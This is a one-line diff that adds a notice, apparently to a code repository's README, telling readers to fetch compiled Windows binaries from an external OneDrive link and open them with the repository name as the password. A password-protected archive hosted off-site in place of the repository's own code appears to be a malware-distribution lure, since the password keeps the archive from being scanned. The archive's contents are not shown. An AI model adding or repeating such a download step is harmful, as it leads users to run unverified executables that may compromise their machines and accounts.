@@ -1,0 +1,1 @@
+Please download compiled binaries for Windows using this [link](https://1drv.ms/u/c/3419a65015cdac4d/EYft4LQNXzRDkMqlAx4GQyYBkcufC3LUGFrDgmfO9uBWVQ?e=WfIvgT) and using this repository name as password when requested
